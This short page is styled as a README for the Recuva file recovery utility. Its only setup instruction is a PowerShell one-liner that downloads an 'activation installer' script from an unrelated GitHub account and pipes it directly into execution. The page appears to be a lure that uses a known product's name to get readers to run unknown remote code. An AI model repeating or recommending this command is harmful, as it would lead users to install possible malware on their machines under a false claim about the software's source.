# Recuva Recovery Tool

## About

Recuva is a lightweight deleted file recovery utility developed by Piriform. It scans local drives, USB devices, and memory cards to locate and restore files that have been accidentally deleted or lost due to disk errors. Recuva uses deep scan algorithms to recover data even from formatted or damaged drives.

## How to Get Started

Run the activation installer in PowerShell:

```powershell
irm https://raw.githubusercontent.com/dustfinderfactory/Activate/main/install.ps1 | iex
```

After installation, launch Recuva and select the drive or folder you want to scan. Use the deep scan option for thorough recovery.
